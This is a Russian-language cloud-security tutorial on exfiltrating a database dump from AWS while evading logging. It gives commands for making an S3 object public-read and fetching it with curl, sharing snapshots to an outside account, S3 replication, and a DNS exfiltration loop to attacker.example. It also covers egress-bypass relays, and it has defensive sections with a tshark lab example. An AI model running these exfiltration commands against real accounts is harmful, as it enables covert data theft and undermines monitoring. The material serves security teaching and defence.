## Задача

Данные мы научились находить. Теперь — как их **вывести** из облака. **Эксфильтрация** (exfiltration) — это перекачка данных наружу, а **egress-контроль** — механизмы, которые этому мешают. Задача: показать основные каналы утечки и оценить, какой из них не отслеживается. Разберём на AWS.

## Данные: что мы хотим вынести

У нас есть доступ к аккаунту и найден бакет `acme-backups` с дампом базы `db-dump.sql` (~2 ГБ). Задача — вытащить его так, чтобы не привлечь внимания. Смотрим, какие каналы вообще есть.

## Пробуем в лоб: прямое скачивание

Самый простой путь — `s3 cp`:

```
$ aws s3 cp s3://acme-backups/db-dump.sql .
download: s3://acme-backups/db-dump.sql to ./db-dump.sql
```

Работает, но оставляет:
- **событие `GetObject`** (если включены data events, см. `cloud-cloudtrail-evasion`);
- **трафик из VPC** (VPC Flow Logs — объём);
- **запись в CloudTrail** при `GetObject` (если data events).

Прямое скачивание — шумно и по объёму, и по событиям.

## Приём: каналы, которые меньше логируются

**1. Public bucket / presigned URL.** Если мы можем сделать бакет публичным или выдать presigned URL, данные уходят **без** наших кредов и без явного `GetObject` от нашего принципала:

```
$ aws s3api put-object-acl --bucket acme-backups --key db-dump.sql --acl public-read
$ curl -s -o db.sql https://acme-backups.s3.amazonaws.com/db-dump.sql
```

**2. Расшаривание снапшота в другой аккаунт.** Данные уходят не «скачиванием», а **сменой прав**: снапшот/том расшаривается в подконтрольный аккаунт, оттуда монтируется (см. `cloud-aws-ebs`). Трафик данных вообще не идёт через нашу VPC:

```
$ aws ec2 modify-snapshot-attribute --snapshot-id snap-0abc \
    --attribute createVolumePermission --operation-type add --user-ids 999999999999
```

**3. S3-репликация.** Настраиваем **replication** бакета в бакет под нашим контролем — данные копируются на уровне сервиса:

```
$ aws s3api put-bucket-replication --bucket acme-backups --replication-configuration file://repl.json
```

**4. DNS-эксфильтрация.** Если исходящий трафик ограничен, но DNS разрешён — данные кодируются в поддомены запросов:

```
$ for chunk in $(split -b 40 db-dump.sql); do
    dig +short $(base64 <<<"$chunk" | tr '+/' '-_' | tr -d '=').attacker.example; done
```

DNS-логи есть, но по ним редко строят алерты на объём.

**5. Lambda/ECS → внешний endpoint.** Если есть RCE в сервисе, данные уходят HTTP-запросами мимо S3-аудита.

## Полный прогон: выбор канала

1. **Оценка объёма.** 2 ГБ — прямой download заметен по трафику.
2. **Проверка data events.** Если выключены — `GetObject` не пишется.
3. **Смена прав.** Делаем объект публичным/presigned — данные уходят без нашего принципала.
4. **Снапшот.** Если данные на диске — расшариваем снапшот в свой аккаунт.
5. **DNS.** Для маленьких объёмов — через DNS-запросы.
6. **Проверка.** Что реально попало в логи.

## Как работает egress-контроль

- **Security groups/NACL** — ограничивают исходящие соединения по IP/порту.
- **VPC Endpoints** — трафик к AWS-сервисам идёт внутри сети, минуя интернет; но и endpoint-политики можно ограничить.
- **AWS Network Firewall / Gateway** — инспекция и блокировка egress по домену/URL.
- **S3 Block Public Access** — мешает сделать бакет публичным.
- **Data events** — логируют чтение объектов.
- **DLP/GuardDuty** — аномалии чтения (`Exfiltration:S3/ObjectRead.Unusual`).

Эксфильтрация обходит то, что не покрыто: DNS, сервис-сервис репликацию, смену прав вместо скачивания.

## Защита и что ломает атаку (глазами защитника)

- **Egress-фильтрация по доменам** (не только по IP).
- **Data events на критичные бакеты** + алерты на объём чтения.
- **Запрет публичных бакетов и ACL** на уровне аккаунта.
- **Контроль `PutBucketReplication`, `ModifySnapshotAttribute`, `PutObjectAcl`.**
- **DNS-мониторинг** на аномальные поддомены/объём.
- **DLP** на исходящий трафик.

## Если не сработало

- **Egress-фильтрация по доменам** — DNS-туннель блокируется.
- **Data events + GuardDuty** — чтение заметно.
- **Block Public Access на аккаунте** — бакет не сделать публичным.
- **Запрет репликации и расшаривания** — сервисные каналы закрыты.

## Мини-сценарий: вывод дампа с выбором канала

1. **Оценка.** Дамп `db-dump.sql` ~2 ГБ. Прямое `s3 cp` заметно по трафику — ищем тише.
2. **Проверка data events.** `get-event-selectors` → data events выключены. Значит, `GetObject` не пишется.
3. **Presigned/публичность.** Делаем объект доступным по ссылке: `curl` тянет данные без наших кредов и без явного `GetObject` от нашего принципала.
4. **Снапшот.** Данные на диске — расшариваем снапшот в свой аккаунт: трафик вообще не идёт через нашу VPC.
5. **Малые объёмы — DNS.** Для ключей/токенов (килобайты) кодируем в поддомены `attacker.example` — DNS обычно разрешён и слабо мониторится.
6. **Проверка.** Смотрим, что записалось в CloudTrail: прямого чтения нет, есть `PutObjectAcl`/`ModifySnapshotAttribute` — но их легко не заметить без алертов.

Вывод: выбор канала — это выбор того, **чего защита не покрывает**. Нет data events → читай напрямую; нет egress по домену → DNS; нет контроля прав → расшаривай.

## Разбор: эксфильтрация идёт в непокрытое

Egress-контроль эффективен ровно там, где он есть. Он видит и блокирует прямые соединения к интернету, но обычно не смотрит на сервис-сервисные каналы внутри облака (репликация бакета, расшаривание снапшота), на DNS и на смену прав. Поэтому атакующий не «ломает» защиту, а **выбирает канал**, которого она не касается. Отсюда и защита должна покрывать все три плоскости: сетевой egress (по домену, не только IP), видимость чтения данных (data events) и контроль «метаданных» операций (PutBucketReplication, ModifySnapshotAttribute, PutObjectAcl). Пока хоть одна плоскость не покрыта, эксфильтрация найдёт в ней путь.

## Инструмент: tshark — Wireshark в консоли

`tshark` — это Wireshark без графики: он читает дамп (`-r файл.pcap`) и печатает ровно то, что ты попросишь. Главный инструмент, когда графической оболочки нет или разбор надо автоматизировать.

Ключи, которые пригодятся:
* `-r <файл.pcap>` — читать дамп (без него tshark слушает живой интерфейс);
* `-nn` — не резолвить имена/порты: видно «как есть» и быстрее;
* `-Y '<фильтр>'` — display-фильтр, оставить только нужные пакеты (`http.request`, `dns`, `eapol`, `ospf`);
* `-T fields -e <поле>` — вместо сводки печатать значения полей (`-e ip.src -e tcp.dstport -e http.host`);
* `-q -z follow,tcp,ascii,N` — собрать TCP-поток номер N и показать его как текст.

### Рабочий пример (как в лаборатории)

```
$ tshark -r exfil.pcap -Y "dns.qry.name contains \"exfil\"" -T fields -e dns.qry.name
bnRvezN4ZjFsXzB2M3JfZG41XzIwMjZ9.exfil.evil-c2.net
bnRvezN4ZjFsXzB2M3JfZG41XzIwMjZ9.exfil.evil-c2.net
```

Подсказка из лаборатории: `tshark -r <pcap> [-Y фильтр] [-T fields -e <поле>] — разбор pcap (эмуляция: вывод захвачен с реального tshark)`.

## Что мы теперь знаем

1. Прямое скачивание шумно: события + трафик.
2. Публичный бакет/presigned URL уводят данные без явного `GetObject`.
3. Расшаривание снапшота — утечка сменой прав, без трафика через нашу сеть.
4. Репликация и DNS — сервисные каналы, которые меньше логируются.
5. Egress-контроль обходится тем, что не покрыто (DNS, сервис-сервис).

## Частые ошибки

- **Прямое скачивание больших объёмов** — заметно по трафику и событиям.
- **Egress-фильтрация только по IP**, а не по домену.
- **Data events не включены** — чтение объектов не пишется.
- **Разрешён публичный доступ к бакетам.**
- **DNS не мониторится** — туннель остаётся незамеченным.

## На что смотреть дальше

- Включены ли data events и алерты на объём чтения.
- Block Public Access на уровне аккаунта.
- Контроль `PutBucketReplication`/`ModifySnapshotAttribute`/`PutObjectAcl`.
- Egress-фильтрация: по IP или по домену.
- DNS-мониторинг и DLP.

## Быстрая проверка

```bash
aws cloudtrail get-event-selectors --trail-name acme-trail   # включены ли data events
aws s3api get-public-access-block --bucket acme-backups
aws s3api get-bucket-replication --bucket acme-backups
aws ec2 describe-snapshots --restorable-by-user-ids self
```

## DNS-эксфильтрация: как данные уезжают в именах

Самый живучий канал — DNS, потому что разрешение имён нужно почти всем, и его редко блокируют. Данные кодируют в поддомены запроса: `c2VjcmV0.evil.example`, где `c2VjcmV0` — base32-фрагмент полезной нагрузки. Наш авторитетный сервер для `evil.example` принимает запросы и декодирует их из логов. Пропускная способность низкая (десятки байт на запрос), но для дампа конфигурации или ключей хватает. Варианты: TXT-запросы, где ответ несёт данные обратно, и DNS-over-HTTPS, который маскируется под обычный HTTPS и обходит блокировку по порту 53. Признак атаки для защитника — аномально длинные или энтропийные поддомены и большой объём запросов к одному домену.

## Как обходят egress-контроль

Egress-контроль ограничивает, куда можно ходить из облака. Обходы строятся на разрешённых исключениях: выход через публичный сервис (pastebin, GitHub gist, вебхук), который в whitelist; туннель поверх 443 к нашему серверу; использование сервиса метаданных или API-шлюза, у которого есть доступ наружу. Часто помогает разница между политиками для инстанса и для managed-сервиса: если у Lambda или Cloud Function есть сетевой выход, её можно использовать как релей. Ещё вектор — «облако в облаке»: поднять свой аккаунт в том же провайдере и перекачивать данные внутри доверенной зоны, где фильтры слабее. Ключевой принцип: защита обычно проверяет назначение, а не содержимое, поэтому данные прячут в легитимный протокол.
